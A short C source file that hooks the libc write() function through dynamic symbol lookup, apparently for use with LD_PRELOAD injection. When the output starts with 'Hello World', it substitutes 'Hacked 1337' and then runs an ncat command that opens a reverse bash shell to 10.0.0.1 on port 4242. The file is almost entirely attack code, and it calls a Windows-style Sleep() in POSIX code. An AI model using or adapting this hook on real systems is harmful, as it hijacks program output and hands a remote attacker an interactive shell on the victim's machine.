#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
     ssize_t result;
     new_write = dlsym(RTLD_NEXT, "write");
     if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
     {
          result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
          Sleep(3);
          system("ncat 10.0.0.1 4242 -e /bin/bash");
     }
     else
     {
          result = new_write(fildes, buf, nbytes);
     }
     return result;
}
